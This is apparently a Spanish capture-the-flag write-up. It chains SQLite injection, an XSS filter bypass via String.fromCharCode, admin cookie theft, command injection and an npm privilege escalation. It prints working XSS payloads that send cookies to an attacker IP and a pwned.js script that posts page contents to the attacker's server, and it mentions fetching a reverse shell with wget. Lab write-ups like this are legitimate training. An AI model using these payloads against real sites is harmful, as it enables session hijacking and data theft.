-----------
- Tags: #sqlite-injection #xss #npm #fromCharCode #cookie #bypassing-xss
----------
## Tecnicas utilizadas

- SQL Injection [SQLI] - Sqlite  
- XSS Injection - Bypassing Techniques (fromCharCode) + Own Javascript Code + Session Cookie Theft  
- Abusing existing parameters - RCE  
- NodeJS npm - Privilege Escalation

## Procedimiento

![[Pasted image 20230607115931.png]]

Comenzamos fuzzeando la pagina web por directorios existentes. Encontramos un `Login` que, haciendo algunas peticiones por burpsuite, podemos llegar a la conclusion de que es vulnerable a **SQLIte Injection**. 
Una vez dentro, con las credenciales encontradas(y el hash crackeado), intentamos colar un XXS. 
La pagina contempla el XXS asi que incorpora algunos mecanismos de seguridad, pero podemos bypassearlo de la siguiente manera:

```js
<img src="test><script>alert("XSS")</script>">
```

Lo que procederemos hacer, es mandarnos la cookie de la persona que este viendo la nota en el momento de la siguiente manera:

```js
<img src="test><script>document.location("http://ip/?cookie=' + document.cookie + '")</script>">
```

Sin embargo, podemos observar que nos lo parchea tambien, probablemente porque en el string existe la palabra `document.location`. Lo que podemos hacer es cambiar el `document.location` -> `document.write`. Entonces el payload quedaria de la siguiente manera:

```js
<img src="test><script>document.write('<script src="http://ip/pwned.js></script>')</script>">
```

Pero tambien lo tiene contemplado, asi que no queda de otra mas que jugar con *FromCharCode*. Esta funcion convirte los valores de decimal a caracteres. En python podemos ejecutar la siguente setencia para covertir toda la cadena a decimal.

```python
sentence = """document.write('<script src="http://ip/pwned.js"z></script>');"""

for character in sentence:
	print(ord(character))
```

Ahora si, pasamos la cadena al payload y quedaria de la siguiente manera:

```js
<img src="test><script>eval(String.fromCharCode(<SENTENCE>));</script>">
```

Vemos que ahora si nos llega la petición. Lo que continuaria seria crear un script *pwned.js* para mandarnos la informacion que necesitemos del usuario que este sufriendo el XSS. Hariamos algo como:

```js
// Crea una variable para tramitar una peticion
var req1 = new XMLHttpRequest();

// Manda la peticion hacia la maquina local, a la direccion deseada, indicamos el "false" para que sea no asincrona.
req1.open('GET', 'http://localhost:8000/vac/:uid', false);

// La mandamos
req1.send();

// Almacenamos el html de la peticion en una variable
var response = req1.responseText;

// Creamos una segunda peticion
var req2 = new XMLHttpRequest();
req2.open('POST', 'http://<my-server>:8000/test', true);
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

var params = encodeURIComponent(response);
req2.send(params);
```

 Se leekea la cookie del administrador, hacemos un robo de sesion. Podemos ver que nos aparece ahora una ventana que dice ADMIN. Si la seleccionamos nos manda a un apartado de administrador en el que podemos descargar las notas y ¿Bookings?. Si pasamos la peticion por burpsuite, nos damos cuenta de que el parametro table nos devuelve lo que ya habiamos visto en el sqlite-injection. Pero si colocamos un `'` nos devuelve un error. Nos indica los caracteres validos y entre ellos esta el `&` asi que, es probable que haya otro parametro a colocar. 
 Si fuzzeamos por el otro parametro con wffuz y encontramos varios resultados, todo estos parecen ser comandos de linux, si los colocamos en la URL vemos que efectivamente se esta acontenciendo una ejecucion de comandos.
 
 Para poder establacernos una shell, tendremos que usar hexadecimal, ya que los puntos no estan dentro de los caracteres permitidos.
 Podemos subir una revershell en bash con wget y ejecutarlo desde la carpeta donde se guarda.
 Para escalar privilegios, hacemos uso de GTFobins.